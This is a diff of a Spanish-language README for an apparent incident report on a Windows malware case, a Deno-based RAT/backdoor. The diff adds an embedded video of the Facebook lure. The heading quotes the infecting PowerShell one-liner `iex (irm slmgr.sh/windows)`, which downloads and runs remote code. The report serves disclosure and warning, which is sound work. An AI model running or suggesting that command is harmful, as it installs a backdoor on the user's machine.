@@ -3,7 +3,16 @@ incidente y declaración para evidenciar el malware existente fechado en 10/07/2
 
 # Incidente de malware usando `iex (irm slmgr.sh/windows)` – Deno RAT / Backdoor
 
+Video de muestra de lo que aparece en facebook:
+
+<div align="center">
+  <video src="https://github.com/djklmr2025/deno-backdoor-slmgr-sh-windows-incident/raw/main/desbloat%20w11.mp4" width="100%" controls>
+  </video>
+</div>
+
+
 ## Resumen
+
 
 El día **[poner fecha]**, en un equipo con Windows, se detectó y neutralizó un malware que se instaló mediante el comando:
 
